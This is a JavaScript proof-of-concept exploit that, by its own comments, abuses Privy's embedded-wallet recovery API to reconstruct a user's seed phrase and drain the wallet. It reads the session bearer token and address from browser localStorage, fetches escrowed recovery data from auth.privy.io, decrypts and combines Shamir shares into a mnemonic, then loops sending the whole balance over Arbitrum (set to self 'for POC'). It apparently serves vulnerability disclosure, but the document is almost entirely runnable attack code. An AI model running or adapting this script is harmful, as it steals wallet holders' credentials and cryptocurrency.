import { combine } from 'shamir-secret-sharing';
import { Mnemonic, Wallet, JsonRpcProvider } from 'ethers';

// This script performs a recovery operation on privy.io,
// decrypts + combines the shares, and drains the wallet.

/* Functions */

const deriveKey = async (data, salt) => crypto.subtle.deriveKey(
    { name: 'PBKDF2', salt, hash: 'SHA-512', iterations: 21e5 },
    await crypto.subtle.importKey('raw', data, 'PBKDF2', false, ['deriveKey']),
    { name: 'AES-GCM', length: 256 }, true, ['decrypt']);

const hashKey = async key => new Uint8Array(
    await crypto.subtle.digest('SHA-256',
        await crypto.subtle.exportKey('raw', key)));

const decrypt = async (data, iv, key) => new Uint8Array(
    await crypto.subtle.decrypt({ iv, name: 'AES-GCM' }, key, data));

// From https://github.com/paulmillr/scure-base
const radix = (data, from, to, padding) => {
    let carry, pos = 0;
    const mask = 2 ** to - 1, res = [];
    for (const n of data) {
        carry = (carry << from) | n;
        for (pos += from; pos >= to; pos -= to)
            res.push(((carry >> (pos - to)) & mask) >>> 0);
        carry &= 2 ** pos - 1;
    }
    carry = (carry << (to - pos)) & mask;
    if (padding && pos > 0) res.push(carry >>> 0);
    return res;
}

const alphabet = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
const charsToU8 = s => {
    const indexes = [...s.replaceAll('=', '')].map(c => alphabet.indexOf(c));
    return Uint8Array.from(radix(indexes, 6, 8, false));
}
const u8ToChars = u8 => {
    const chars = radix(u8, 8, 6, true).map(c => alphabet[c]);
    for (; chars.length * 6 % 8;) chars.push('=');
    return chars.join('');
}

const privy = async (op, body) => await (await
    fetch(`https://auth.privy.io/api/v1/embedded_wallets/${address}/recovery/${op}`, {
        method: 'POST',
        headers: {
            'content-type': 'application/json',
            'authorization': `Bearer ${bearer}`,
            'privy-app-id': appId,
        },
        body: JSON.stringify(body)
    })).json();

/* Execution */

// Inputs
const appId = 'clmu87yj904a1lf0fz6lflxku';
const bearer = localStorage.getItem('privy:token').replaceAll('"', '');
const address = JSON.parse(localStorage.getItem('privy:connections'))[0].address;

// Recover
const [recoveryCode, recoverySalt] = await Promise.all([
    privy('escrow').then(r => new TextEncoder().encode(r.recovery_code)),
    privy('salt').then(r => charsToU8(r.recovery_key_derivation_salt)),
]);
const key = await deriveKey(recoveryCode, recoverySalt);
const keyHash = u8ToChars(await hashKey(key));
const recovery = await privy('shares', { 'recovery_key_hash': keyHash });
const share1 = charsToU8(recovery.share);

// Decrypt
const encryptedShare = charsToU8(recovery.encrypted_recovery_share);
const iv = charsToU8(recovery.encrypted_recovery_share_iv);
const share2 = await decrypt(encryptedShare, iv, key);

// Combine
const combined = await combine([share1, share2]);
const phrase = Mnemonic.entropyToPhrase(combined);

// Drain
const provider = new JsonRpcProvider('https://arb1.arbitrum.io/rpc');
const wallet = Wallet.fromPhrase(phrase, provider);
const tx = { to: address }; // Send to self for POC
while (true) {
    tx.value = await provider.getBalance(address);
    tx.gasLimit = await provider.estimateGas(tx);
    tx.value -= (tx.gasLimit * BigInt(1200000000));
    if (tx.value <= 0) break;
    try { await wallet.sendTransaction(tx); break; }
    catch { }
}
